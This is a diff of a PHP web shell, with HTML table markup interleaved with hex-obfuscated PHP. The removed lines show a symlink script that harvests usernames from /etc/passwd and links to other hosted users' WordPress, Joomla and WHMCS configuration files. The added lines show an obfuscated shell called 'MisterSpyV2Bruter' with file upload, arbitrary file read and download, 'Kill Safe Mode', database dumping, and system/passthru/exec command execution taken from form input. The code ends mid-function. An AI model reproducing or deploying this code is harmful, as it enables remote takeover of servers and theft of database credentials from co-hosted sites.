-<input type=submit name="usre" value="Get Usernames & Config !" /></form>
+     <tr>
+   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Tools</strong></td>
+       </tr>
+    <tr>
+   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Upload</strong></td>
+   <td valign="top" bgcolor="#151515" colspan="5">
+  <strong>
+<?php  goto taAfY; SBRJY: class my_sql { var $host = "\154\157\143\x61\x6c\x68\157\163\164"; var $port = ''; var $user = ''; var $pass = ''; var $base = ''; var $db = ''; var $connection; var $res; var $error; var $rows; var $columns; var $num_rows; var $num_fields; var $dump; function connect() { switch ($this->db) { case "\x6d\x79\x73\x71\154\151": if (empty($this->port)) { $this->port = "\63\x33\x30\x36"; } if (!function_exists("\155\171\x73\161\154\151\x5f\143\x6f\x6e\156\x65\143\x74")) { return 0; } $this->connection = @mysqli_connect($this->host . "\72" . $this->port, $this->user, $this->pass); if (is_resource($this->connection)) { return 1; } $this->error = @mysqli_errno() . "\x20\72\40" . @mysqli_error(); break; case "\115\123\123\x51\x4c": if (empty($this->port)) { $this->port = "\61\64\x33\63"; } if (!function_exists("\x6d\163\163\161\154\x5f\x63\x6f\x6e\x6e\145\143\164")) { return 0; } $this->connection = @mssql_connect($this->host . "\x2c" . $this->port, $this->user, $this->pass); if ($this->connection) { return 1; } $this->error = "\x43\141\x6e\47\x74\x20\143\157\x6e\x6e\x65\x63\x74\40\164\157\40\x73\x65\x72\x76\145\162"; break; case "\x50\x6f\163\164\147\x72\x65\123\121\114": if (empty($this->port)) { $this->port = "\65\x34\63\62"; } $str = "\x68\x6f\163\164\x3d\47" . $this->host . "\47\x20\160\x6f\x72\x74\75\47" . $this->port . "\47\40\165\x73\145\x72\x3d\47" . $this->user . "\47\x20\160\x61\163\x73\x77\x6f\x72\x64\75\x27" . $this->pass . "\47\x20\144\142\156\141\155\145\x3d\47" . $this->base . "\x27"; if (!function_exists("\160\x67\137\143\x6f\156\156\x65\143\164")) { return 0; } $this->connection = @pg_connect($str); if (is_resource($this->connection)) { return 1; } $this->error = @pg_last_error($this->connection); break; case "\x4f\162\141\x63\154\145": if (!function_exists("\x6f\143\x69\x6c\157\147\157\x6e")) { return 0; } $this->connection = @ocilogon($this->user, $this->pass, $this->base); if (is_resource($this->connection)) { return 1; } $error = @ocierror(); $this->error = $error["\x6d\x65\163\x73\141\x67\145"]; break; } return 0; } function select_db() { switch ($this->db) { case "\x6d\x79\163\161\154\151": if (@mysqli_select_db($this->base, $this->connection)) { return 1; } $this->error = @mysqli_errno() . "\40\x3a\x20" . @mysqli_error(); break; case "\115\123\123\121\114": if (@mssql_select_db($this->base, $this->connection)) { return 1; } $this->error = "\103\x61\156\x27\164\40\163\x65\x6c\x65\x63\x74\x20\x64\x61\164\x61\142\141\163\x65"; break; case "\120\157\163\x74\x67\x72\x65\x53\x51\114": return 1; break; case "\117\x72\x61\x63\154\145": return 1; break; } return 0; } function query($query) { $this->res = $this->error = ''; switch ($this->db) { case "\155\x79\163\161\154\x69": if (false === ($this->res = @mysqli_query("\x2f\x2a" . chr(0) . "\x2a\57" . $query, $this->connection))) { $this->error = @mysqli_error($this->connection); return 0; } else { if (is_resource($this->res)) { return 1; } } return 2; break; case "\x4d\123\123\121\x4c": if (false === ($this->res = @mssql_query($query, $this->connection))) { $this->error = "\x51\165\145\x72\171\40\145\x72\x72\157\162"; return 0; } else { if (@mssql_num_rows($this->res) > 0) { return 1; } } return 2; break; case "\120\157\x73\x74\x67\x72\145\123\121\114": if (false === ($this->res = @pg_query($this->connection, $query))) { $this->error = @pg_last_error($this->connection); return 0; } else { if (@pg_num_rows($this->res) > 0) { return 1; } } return 2; break; case "\x4f\x72\x61\x63\154\x65": if (false === ($this->res = @ociparse($this->connection, $query))) { $this->error = "\121\165\145\x72\171\40\x70\141\162\163\145\x20\145\x72\x72\x6f\162"; } else { if (@ociexecute($this->res)) { if (@ocirowcount($this->res) != 0) { return 2; } return 1; } $error = @ocierror(); $this->error = $error["\155\145\x73\163\141\147\145"]; } break; } return 0; } function get_result() { $this->rows = array(); $this->columns = array(); $this->num_rows = $this->num_fields = 0; switch ($this->db) { case "\x6d\171\163\x71\x6c\151": $this->num_rows = @mysqli_num_rows($this->res); $this->num_fields = @mysqli_num_fields($this->res); while (false !== ($this->rows[] = @mysqli_fetch_assoc($this->res))) { } @mysqli_free_result($this->res); if ($this->num_rows) { $this->columns = @array_keys($this->rows[0]); return 1; } break; case "\115\x53\123\121\114": $this->num_rows = @mssql_num_rows($this->res); $this->num_fields = @mssql_num_fields($this->res); while (false !== ($this->rows[] = @mssql_fetch_assoc($this->res))) { } @mssql_free_result($this->res); if ($this->num_rows) { $this->columns = @array_keys($this->rows[0]); return 1; } break; case "\120\157\163\x74\147\x72\145\123\121\114": $this->num_rows = @pg_num_rows($this->res); $this->num_fields = @pg_num_fields($this->res); while (false !== ($this->rows[] = @pg_fetch_assoc($this->res))) { } @pg_free_result($this->res); if ($this->num_rows) { $this->columns = @array_keys($this->rows[0]); return 1; } break; case "\x4f\x72\x61\x63\154\x65": $this->num_fields = @ocinumcols($this->res); while (false !== ($this->rows[] = @oci_fetch_assoc($this->res))) { $this->num_rows++; } @ocifreestatement($this->res); if ($this->num_rows) { $this->columns = @array_keys($this->rows[0]); return 1; } break; } return 0; } function dump($table) { if (empty($table)) { return 0; } $this->dump = array(); $this->dump[0] = "\43\43"; $this->dump[1] = "\x23\x23\x20\55\x2d\55\x2d\55\x2d\55\x2d\x2d\55\x2d\55\55\x2d\55\x2d\x2d\55\x2d\55\55\x2d\x2d\x2d\x2d\x2d\x2d\55\x2d\x2d\55\55\55\55\x2d\55\55\x2d\x2d\x20"; $this->dump[2] = "\43\43\x20\40\103\162\145\x61\x74\145\x64\72\x20" . date("\x64\57\155\57\x59\x20\x48\x3a\151\72\x73"); $this->dump[3] = "\x23\x23\40\x44\x61\x74\141\x62\141\163\145\x3a\40" . $this->base; $this->dump[4] = "\43\43\x20\40\40\x20\x54\x61\x62\154\x65\72\40" . $table; $this->dump[5] = "\43\x23\40\x2d\x2d\55\55\55\x2d\55\55\x2d\x2d\x2d\x2d\x2d\55\x2d\x2d\55\55\x2d\55\55\55\55\55\55\55\55\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\55\x2d\x2d\x2d\40"; switch ($this->db) { case "\x6d\x79\163\161\x6c\x69": $this->dump[0] = "\43\43\x20\x6d\171\x73\x71\154\x69\x20\144\x75\155\160"; if ($this->query("\57\52" . chr(0) . "\52\x2f\x20\123\x48\117\127\40\x43\x52\x45\x41\124\x45\40\124\x41\x42\x4c\x45\40\x60" . $table . "\x60") != 1) { return 0; } if (!$this->get_result()) { return 0; } $this->dump[] = $this->rows[0]["\x43\162\x65\x61\x74\145\40\x54\x61\142\x6c\145"] . "\73"; $this->dump[] = "\43\x23\40\55\55\x2d\55\55\55\x2d\x2d\x2d\55\x2d\55\55\x2d\x2d\x2d\55\x2d\x2d\x2d\55\x2d\55\x2d\55\x2d\55\55\55\x2d\x2d\55\55\x2d\x2d\x2d\x2d\55\55\40"; if ($this->query("\x2f\x2a" . chr(0) . "\x2a\x2f\x20\x53\x45\114\105\103\x54\40\52\x20\x46\x52\x4f\115\40\140" . $table . "\x60") != 1) { return 0; } if (!$this->get_result()) { return 0; } for ($i = 0; $i < $this->num_rows; $i++) { foreach ($this->rows[$i] as $k => $v) { $this->rows[$i][$k] = @mysqli_real_escape_string($v); } $this->dump[] = "\x49\116\x53\105\122\124\40\111\x4e\x54\x4f\x20\x60" . $table . "\x60\x20\x28\x60" . @implode("\140\x2c\40\140", $this->columns) . "\x60\51\40\126\x41\114\125\x45\x53\x20\x28\x27" . @implode("\47\x2c\x20\47", $this->rows[$i]) . "\x27\51\73"; } break; case "\115\123\123\x51\x4c": $this->dump[0] = "\x23\x23\40\x4d\x53\123\121\114\x20\x64\165\x6d\160"; if ($this->query("\123\105\x4c\105\x43\124\x20\x2a\x20\x46\122\117\115\40" . $table) != 1) { return 0; } if (!$this->get_result()) { return 0; } for ($i = 0; $i < $this->num_rows; $i++) { foreach ($this->rows[$i] as $k => $v) { $this->rows[$i][$k] = @addslashes($v); } $this->dump[] = "\111\116\123\x45\122\x54\40\x49\x4e\x54\117\40" . $table . "\x20\50" . @implode("\x2c\x20", $this->columns) . "\51\x20\126\x41\x4c\125\105\x53\40\x28\x27" . @implode("\47\54\x20\x27", $this->rows[$i]) . "\47\51\x3b"; } break; case "\x50\x6f\x73\164\x67\162\145\x53\121\114": $this->dump[0] = "\43\x23\40\120\157\x73\164\147\162\x65\123\121\x4c\40\144\165\155\x70"; if ($this->query("\123\x45\114\105\x43\x54\x20\52\x20\106\122\117\115\x20" . $table) != 1) { return 0; } if (!$this->get_result()) { return 0; } for ($i = 0; $i < $this->num_rows; $i++) { foreach ($this->rows[$i] as $k => $v) { $this->rows[$i][$k] = @addslashes($v); } $this->dump[] = "\111\116\x53\105\x52\x54\40\x49\x4e\124\117\40" . $table . "\40\x28" . @implode("\54\x20", $this->columns) . "\x29\40\126\x41\x4c\125\105\x53\40\x28\x27" . @implode("\x27\x2c\40\47", $this->rows[$i]) . "\47\51\x3b"; } break; case "\x4f\x72\141\x63\x6c\x65": $this->dump[0] = "\43\x23\40\117\122\101\x43\x4c\x45\x20\x64\165\155\x70"; $this->dump[] = "\43\x23\x20\165\x6e\144\145\162\40\x63\x6f\156\163\164\162\165\x63\x74\x69\157\156"; break; default: return 0; break; } return 1; } function close() { switch ($this->db) { case "\155\171\163\x71\x6c\151": @mysqli_close($this->connection); break; case "\115\x53\123\x51\114": @mssql_close($this->connection); break; case "\120\157\163\x74\147\162\x65\x53\x51\114": @pg_close($this->connection); break; case "\117\x72\141\x63\x6c\x65": @oci_close($this->connection); break; } } function affected_rows() { switch ($this->db) { case "\x6d\x79\163\x71\x6c\151": return @mysqli_affected_rows($this->res); break; case "\115\x53\x53\x51\x4c": return @mssql_affected_rows($this->res); break; case "\120\157\163\164\x67\162\145\123\x51\x4c": return @pg_affected_rows($this->res); break; case "\117\162\x61\x63\154\x65": return @ocirowcount($this->res); break; default: return 0; break; } } } goto IWtrj; uRLNp: function in($type, $name, $size, $value, $checked = 0) { $ret = "\74\151\156\160\x75\x74\x20\164\x79\160\x65\x3d" . $type . "\x20\x6e\141\x6d\145\75" . $name . "\40"; if ($size != 0) { $ret .= "\x73\x69\x7a\145\75" . $size . "\40"; } $ret .= "\x76\141\x6c\165\145\x3d\42" . $value . "\42"; if ($checked) { $ret .= "\x20\143\x68\x65\143\x6b\145\144"; } return $ret . "\76"; } goto SBRJY; vTecb: ?>
+     <tr>
+   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Server Info</strong></td>
+       </tr>
+    <tr>
+   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Safe Mode</strong></td>
+   <td valign="top" bgcolor="#151515" colspan="5">
+  <strong>
+ <?php  goto Xkwy1; e8sVX: echo "\123\145\162\x76\145\162\x20\111\120\40\75\40\x3c\x66\x6f\156\x74\40\143\157\154\x6f\x72\x3d\x72\x65\x64\76" . gethostbyname($_SERVER["\110\124\x54\120\x5f\110\117\x53\124"]) . "\xa\x20\74\57\x66\157\156\x74\x3e\133\74\57\x73\160\x61\x6e\x3e\xa\40\x3c\141\40\x68\162\x65\x66\75\47\150\x74\x74\x70\x3a\x2f\57\x62\151\x6e\147\x2e\143\x6f\155\x2f\x73\145\x61\x72\143\150\77\x71\75\151\160\72" . $serverIP . "\46\x67\157\x3d\46\x66\x6f\162\155\75\121\x42\114\x48\x26\x66\151\x6c\164\75\x61\x6c\154\x27\x20\x74\141\x72\x67\x65\x74\x3d\42\137\142\154\141\x6e\x6b\42\76\102\151\156\147\40\x53\145\x61\162\x63\x68\x3c\x2f\141\x3e\x5d\x5b\74\57\x73\160\x61\156\x3e\74\141\x20\150\x72\145\146\75\47\150\x74\164\x70\72\x2f\x2f\x7a\157\x6e\145\55\150\56\143\157\x6d\57\x61\162\143\150\x69\166\145\x2f\x69\x70\x3d" . $serverIP . "\47\40\x74\141\162\x67\145\164\x3d\42\x5f\142\154\141\156\153\x22\x3e\132\x6f\156\145\55\x48\x20\x53\145\141\162\x63\150\74\x2f\141\76\x5d\74\x63\145\156\164\x65\162\x3e"; goto P90pG; fNIyb: echo "\74\x46\x4f\122\x4d\x20\155\145\164\150\x6f\x64\75\x27\x50\117\123\x54\x27\40\x61\x63\x74\x69\x6f\x6e\75\47{$REQUEST_URI}\47\x20\145\156\143\164\x79\x70\145\x3d\x27\155\165\x6c\x74\x69\x70\141\162\164\x2f\x66\x6f\162\155\x2d\144\141\164\141\x27\x3e\12\40\x3c\160\x20\x61\154\x69\147\156\x3d\x27\x63\145\156\x74\145\x72\47\76\xa\40\74\x49\116\120\125\x54\x20\164\171\160\x65\x3d\x27\x73\x75\x62\155\x69\x74\x27\40\156\141\x6d\145\75\47\113\151\154\154\x27\x20\x76\141\154\165\145\75\47\151\146\x20\x53\141\146\x65\40\x4d\157\144\x65\x20\x69\163\40\117\x6e\40\x43\154\x69\143\x20\x48\x65\x72\145\x20\x54\x6f\40\113\x69\x6c\154\x20\124\150\145\40\123\141\x66\x65\115\x6f\144\145\40\133\151\156\151\56\x70\150\160\135\40\133\x70\x68\x70\56\x69\156\151\x5d\40\x5b\x2e\x68\164\x61\x63\143\145\x73\x73\135\47\x20\151\x64\75\x69\156\x70\165\x74\40\x73\x74\x79\154\145\75\47\x66\x6f\x6e\x74\55\163\151\172\x65\x3a\x20\x31\62\x70\164\x3b\40\146\x6f\x6e\x74\x2d\167\145\151\x67\x68\x74\72\40\x62\x6f\x6c\144\x3b\x20\x62\157\x72\x64\x65\162\x2d\163\164\x79\x6c\x65\x3a\40\x69\x6e\163\x65\x74\73\x20\142\157\162\144\145\x72\55\x77\x69\x64\x74\150\72\x20\61\x70\170\x27\x3e\74\57\x70\x3e\12\74\57\146\157\162\155\76\12"; goto E4ueD; rMdK3: ?>
+  </strong>
+  </td>
+       </tr>
 
+          <tr>
+   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Uname</strong></td>
+   <td valign="top" bgcolor="#151515" colspan="5">
+<?php  goto CaZRM; MmdQ6: if ($_POST["\160\141\x67\x65"] == "\x73\x68\x6f\167") { $pathclass = $_POST["\160\x61\164\x68\x63\x6c\141\x73\x73"]; echo "\12\11\x3c\x66\157\162\x6d\40\x6d\145\164\150\x6f\144\75\42\x50\117\123\x54\42\76\xa\11\74\x69\156\160\x75\x74\x20\164\171\160\145\75\x22\150\151\x64\144\x65\x6e\x22\40\156\x61\155\x65\x3d\42\x70\x61\147\x65\x22\x20\166\141\154\165\x65\75\42\x65\144\151\x74\42\76\12\11"; $sahacker = fopen($pathclass, "\x72\x62"); echo "\x3c\x63\x65\156\164\x65\162\x3e" . $pathclass . "\x3c\x62\162\76\74\164\145\x78\164\x61\162\x65\141\x20\x64\151\x72\75\42\x6c\164\162\42\x20\x6e\141\x6d\x65\75\42\143\x6f\x64\145\x22\40\163\x74\171\154\x65\75\42\x77\x69\x64\x74\150\72\40\x38\x34\65\x70\x78\73\40\x68\x65\151\x67\150\164\x3a\x20\x34\60\x34\160\170\42\76"; $code = fread($sahacker, filesize($pathclass)); echo $code = htmlspecialchars($code); echo "\x3c\x2f\x74\145\x78\x74\141\162\145\x61\76"; fclose($sahacker); echo "\xa\11\74\142\x72\76\74\x69\156\x70\165\164\40\164\x79\160\x65\x3d\x22\164\145\x78\x74\42\40\156\141\x6d\145\x3d\x22\160\141\164\x68\x63\x6c\x61\163\x73\x22\40\166\141\154\165\x65\x3d\42" . $pathclass . "\42\40\163\164\x79\154\145\75\x22\x77\151\x64\x74\150\x3a\40\64\64\65\160\170\73\42\x3e\xa\x9\74\142\x72\76\74\x73\x74\162\157\156\x67\x3e\74\x69\156\x70\x75\164\40\x74\x79\x70\x65\x3d\42\x73\165\x62\x6d\151\x74\x22\x20\166\x61\x6c\165\145\x3d\42\x65\144\151\x74\40\x66\x69\154\145\x22\x3e\12\11\x3c\57\146\157\x72\x6d\x3e\xa\x9"; die; } goto zXD4H; taAfY: echo "\x3c\x66\157\x72\x6d\40\141\x63\x74\151\x6f\x6e\x3d\42\42\40\155\x65\164\x68\x6f\x64\x3d\x22\160\157\x73\164\x22\40\145\156\x63\x74\x79\160\x65\75\42\x6d\165\x6c\164\151\x70\141\162\164\x2f\146\x6f\x72\x6d\x2d\144\x61\164\141\42\x20\156\141\155\x65\75\x22\x75\160\154\157\x61\144\x65\x72\42\40\151\144\75\42\x75\160\x6c\x6f\x61\144\145\162\x22\x3e"; goto qzqI_; oxNHr: if ($_POST["\137\165\160\154"] == "\x55\160\x6c\x6f\141\144") { if (@copy($_FILES["\146\151\x6c\x65"]["\x74\155\160\137\x6e\x61\155\145"], $_FILES["\x66\151\154\x65"]["\156\141\155\x65"])) { echo "\x3c\142\x3e\x55\x70\x6c\157\x61\144\40\123\x55\x43\123\x45\x53\40\72\x29\x20\41\41\41\74\x2f\x62\76\x3c\142\162\76\x3c\x62\x72\x3e"; } else { echo "\74\142\76\125\x70\154\x6f\x61\x64\40\106\141\151\154\145\144\x20\72\x28\40\x21\41\41\x3c\x2f\142\x3e\74\x62\x72\76\74\x62\162\76"; } } goto vTecb; IWtrj: if (!empty($_POST["\143\x63\x63\x63"]) && $_POST["\143\x63\x63\x63"] == "\144\157\x77\x6e\154\157\x61\144\x5f\x66\x69\x6c\145" && !empty($_POST["\144\x5f\156\141\x6d\x65"])) { if (!($file = @fopen($_POST["\x64\137\x6e\x61\x6d\145"], "\162"))) { err(1, $_POST["\x64\x5f\156\x61\x6d\x65"]); $_POST["\x63\143\143\x63"] = ''; } else { @ob_clean(); $filename = @basename($_POST["\144\137\x6e\x61\155\x65"]); $filedump = @fread($file, @filesize($_POST["\144\x5f\156\x61\x6d\x65"])); fclose($file); $content_encoding = $mime_type = ''; compress($filename, $filedump, $_POST["\x63\x6f\x6d\x70\x72\x65\163\163"]); if (!empty($content_encoding)) { header("\x43\157\156\x74\145\156\164\x2d\x45\x6e\143\x6f\144\x69\156\x67\72\x20" . $content_encoding); } header("\x43\157\x6e\164\145\156\x74\55\164\171\x70\145\x3a\x20" . $mime_type); header("\103\x6f\156\x74\145\156\164\55\144\151\x73\x70\157\163\x69\164\x69\x6f\156\72\x20\141\164\164\x61\x63\x68\155\145\156\x74\x3b\40\x66\151\154\145\156\141\155\145\75\x22" . $filename . "\42\x3b"); echo $filedump; die; } } goto CgCVc; KsgZY: $serverIP = gethostbyname($_SERVER["\x48\124\x54\x50\x5f\x48\117\x53\124"]); goto e8sVX; CgCVc: if (isset($_GET["\160\150\x70\x69\x6e\146\157"])) { echo @phpinfo(); echo "\74\142\x72\x3e\x3c\x64\x69\166\40\x61\x6c\x69\147\156\x3d\143\145\x6e\x74\145\x72\x3e\x3c\x66\157\x6e\x74\40\146\x61\x63\145\x3d\126\x65\x72\144\x61\156\141\x20\x73\x69\172\x65\x3d\55\62\x3e\74\142\76\x5b\40\x3c\141\x20\x68\x72\145\146\x3d" . $_SERVER["\x50\110\x50\x5f\x53\x45\x4c\106"] . "\76\102\101\x43\113\74\57\x61\76\x20\135\x3c\x2f\142\76\x3c\57\x66\157\x6e\164\76\74\57\x64\151\166\x3e"; die; } goto KGVnY; BT82_: ?>
+</tr>
+</td>
 
+                <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Kill Safe Mode</strong></td>
+   <td valign="top" bgcolor="#151515" colspan="5">
+<strong>
 
+<?php  goto svl5Y; xMs8g: @set_time_limit(0); goto Y3dIo; j7jZA: ?>
+<title>MisterSpyV2Bruter</title>
+<?php  goto xMs8g; Q_sWr: ?>
 
-<?php
-if(isset($_POST['usre'])){
-?><form method=post>
-<textarea rows=10 cols=30 name=user><?php $users=file("/etc/passwd");
-foreach($users as $user)
-{
-$str=explode(":",$user);
-echo $str[0]."\n";
-}
+</strong>
+</tr>
+</td>
+<tr>
 
-?></textarea><br><br>
-<input type=submit name=su value=" Get Configuration Files :)" /></form>
-<?php } ?>
-<?php
-error_reporting(0);
-echo "<font color=red size=2 face=\"comic sans ms\">";
-if(isset($_POST['su']))
-{
-
-$dir=mkdir('dzmafia',0777);
-$r = " Options all \n DirectoryIndex dz.html \n Require None \n Satisfy Any";
-$f = fopen('dzmafia/.htaccess','w');
-
-fwrite($f,$r);
-$consym="<a href=dzmafia/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
-echo "<br>folder where config files has been symlinked By The 1962 Script Coded By Akram Stelle (Dz Mafia Team)<br><u><font color=red size=2 face=\"comic sans ms\">$consym</font></u>";
-
-$usr=explode("\n",$_POST['user']);
-
-foreach($usr as $uss )
-{
-$us=trim($uss);
-
-$r="dzmafia/";
-symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
-symlink('/home/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
-symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
-symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
-symlink('/home/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
-symlink('/home/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
-symlink('/home/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
-symlink('/home/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
-symlink('/home/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
-symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..config');
-symlink('/home/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
-symlink('/home/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
-symlink('/home/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
-symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
-symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
-symlink('/home/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
-symlink('/home/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
-symlink('/home/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
-symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
-symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
-symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
-symlink('/home/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
-symlink('/home/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
-symlink('/home/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
-symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
-symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
-}
-}
-?>
+  <tr>
+   <td valign="top" bgcolor="#151515" style="width: 139px"><strong>SerVer Search</strong></td>
+   <td valign="top" bgcolor="#151515" colspan="5">
+  <strong>
+<?php  goto yhFst; Elgqq: function ccmmdd($ccmmdd2, $att) { global $ccmmdd2, $att; echo "\12\x9\x3c\x74\x61\x62\154\x65\40\163\x74\x79\x6c\145\75\x22\167\151\144\x74\x68\x3a\40\61\x30\60\x25\42\x20\143\154\141\163\x73\75\x22\163\164\171\x6c\x65\x31\x22\x20\144\x69\162\x3d\x22\162\164\x6c\x22\x3e\12\x9\11\74\164\x72\x3e\12\11\x9\x9\74\164\x64\x20\x63\154\x61\x73\x73\x3d\42\x73\164\171\154\145\x39\42\x3e\74\163\x74\x72\157\x6e\147\x3e\x3f\77\77\110\77\x2f\x73\x74\162\x6f\x6e\147\x3e\x3c\x2f\x74\x64\76\12\11\x9\x3c\x2f\164\x72\76\xa\11\x9\x3c\x74\x72\x3e\xa\11\11\11\74\164\144\x20\x63\154\141\x73\x73\75\x22\x73\x74\x79\154\145\x31\x33\42\76\12\x9\x9\x9\11\11\74\146\x6f\x72\x6d\x20\x6d\x65\164\150\157\x64\x3d\42\160\x6f\x73\x74\x22\76\12\11\x9\11\x9\11\11\74\163\145\154\x65\x63\x74\x20\x6e\141\155\x65\x3d\x22\141\164\x74\42\40\144\151\x72\75\x22\162\x74\x6c\x22\x20\163\164\x79\x6c\x65\x3d\42\150\145\151\x67\x68\x74\x3a\40\x31\x30\71\160\x78\x22\40\163\151\172\145\75\x22\66\42\76\xa\x9"; if ($_POST["\x61\x74\x74"] == null) { echo "\x9\11\11\11\x9\x9\x3c\157\x70\x74\151\157\156\40\x76\141\x6c\x75\x65\75\42\163\171\x73\x74\x65\x6d\x22\x20\x73\x65\154\x65\x63\164\145\144\x3d\42\42\x3e\163\x79\x73\x74\145\x6d\x3c\x2f\157\160\x74\151\x6f\x6e\x3e"; } else { echo "\x9\x9\x9\x9\x9\11\x3c\157\160\164\151\157\156\x20\x76\x61\154\x75\x65\75\47{$_POST["\x61\164\164"]}\47\40\163\x65\154\145\143\x74\x65\x64\x3d\47\47\76{$_POST["\x61\164\x74"]}\x3c\x2f\x6f\x70\x74\x69\x6f\x6e\x3e\12\x9\11\11\11\x9\x9\11\74\157\x70\x74\151\x6f\x6e\40\166\x61\154\x75\x65\x3d\x73\171\x73\x74\x65\x6d\76\x73\x79\163\x74\145\155\74\57\x6f\160\x74\151\x6f\156\x3e\xa\x9"; } echo "\12\11\11\11\11\x9\x9\11\x3c\x6f\x70\x74\x69\x6f\x6e\x20\166\141\x6c\165\145\x3d\x22\x70\x61\163\x73\x74\x68\x72\x75\x22\x3e\x70\141\x73\x73\x74\150\162\x75\x3c\57\157\160\x74\151\x6f\156\x3e\xa\11\11\11\11\x9\11\11\74\x6f\x70\164\151\157\156\40\x76\x61\154\x75\x65\x3d\42\145\170\145\143\x22\76\x65\x78\145\143\74\57\157\x70\164\x69\x6f\156\76\12\x9\11\x9\11\11\11\x9\74\x6f\x70\x74\151\157\156\x20\x76\141\x6c\x75\x65\x3d\42\163\x68\145\x6c\x6c\x5f\x65\x78\145\143\42\76\163\150\x65\x6c\x6c\x5f\145\x78\x65\143\74\x2f\157\x70\164\151\x6f\156\x3e\xa\11\11\11\x9\x9\x9\74\57\163\x65\154\x65\143\164\76\xa\x9\11\x9\11\11\x9\x9\x3c\x69\x6e\160\165\164\x20\156\141\155\145\75\42\x70\x61\147\x65\x22\x20\166\141\x6c\x75\145\75\42\x63\x63\x6d\x6d\x64\144\42\x20\x74\171\x70\145\75\42\x68\151\144\x64\x65\x6e\x22\76\x3c\142\x72\76\12\11\11\x9\11\11\x9\x9\x3c\151\156\160\165\x74\x20\x64\x69\162\75\x22\x6c\164\x72\x22\40\156\x61\x6d\145\75\42\x63\x63\x6d\155\144\x64\x32\42\x20\x73\x74\171\x6c\x65\75\42\x77\151\144\164\x68\x3a\40\x31\67\63\160\170\42\40\164\171\160\145\75\x22\164\x65\170\164\42\40\166\x61\154\x75\x65\x3d\42"; if (!$_POST["\143\x63\155\155\144\x64\x32"]) { echo "\x64\x69\162"; } else { echo $_POST["\x63\x63\155\155\x64\x64\62"]; } echo "\42\x3e\74\142\162\x3e\12\x9\11\11\x9\x9\x9\11\x3c\x69\x6e\x70\165\164\40\x74\171\160\x65\75\42\163\x75\142\155\151\164\42\40\166\141\154\165\145\75\42\x3f\77\x3f\x3e\xa\x9\11\11\x9\11\x3c\57\146\x6f\x72\x6d\x3e\xa\12\x9\x9\x9\x3c\57\164\144\76\xa\x9\x9\74\x2f\164\162\76\12\11\11\74\x74\x72\76\xa\11\x9\11\x3c\164\144\x20\x63\154\141\163\163\x3d\x22\x73\x74\171\154\x65\x31\63\42\76\xa\11"; if ($_POST[att] == "\163\x79\x73\x74\145\x6d") { echo "\12\11\x9\x9\x9\11\11\x3c\164\145\x78\x74\141\x72\145\x61\x20\x64\151\x72\75\42\154\x74\x72\42\x20\156\141\x6d\x65\75\x22\x54\x65\x78\164\x41\162\x65\x61\61\42\x20\163\164\x79\154\145\75\42\x77\151\144\164\150\72\x20\x37\64\x35\160\170\73\x20\x68\x65\x69\147\x68\x74\x3a\x20\x32\60\64\160\x78\x22\x3e"; system($_POST["\x63\x63\155\155\x64\x64\62"]); echo "\11\11\11\x9\x9\74\57\164\145\170\x74\141\162\x65\141\x3e"; } if ($_POST[att] == "\x70\x61\x73\x73\164\x68\162\x75") { echo "\xa\11\11\x9\11\11\x9\x3c\164\x65\x78\164\141\162\145\x61\40\x64\x69\x72\75\42\154\x74\x72\42\x20\156\x61\155\x65\x3d\42\x54\x65\170\x74\x41\x72\x65\141\61\42\40\163\164\x79\x6c\x65\75\x22\x77\151\144\164\x68\72\40\x37\64\65\160\170\73\x20\x68\x65\151\x67\x68\x74\x3a\x20\x32\60\64\160\x78\42\76"; passthru($_POST["\143\143\x6d\155\x64\x64\62"]); echo "\x9\x9\x9\11\11\x3c\x2f\164\145\170\x74\x61\162\145\x61\76"; } if ($_POST[att] == "\x65\x78\x65\x63") { echo "\x9\x9\x9\11\x9\x3c\x74\x65\170\x74\141\162\145\141\x20\144\x69\162\75\42\154\x74\x72\42\40\x6e\141\155\145\75\x22\x54\145\x78\x74\x41\x72\x65\x61\x31\42\40\x73\164\x79\154\x65\x3d\x22\167\x69\144\x74\x68\72\40\67\x34\x35\160\x78\x3b\40\150\145\151\x67\x68\164\x3a\x20\x32\60\64\x70\x78\42\76"; exec($_POST["\143\x63\155\x6d\x64\x64\62"], $res); echo $res = join("\xa", $res); echo "\11\11\x9\x9\x9\x3c\x2f\x74\x65\x78\x74\x61\162\x65\x61\76"; } if ($_POST[att] == "\163\150\145\154\154\x5f\145\x78\145\x63") { 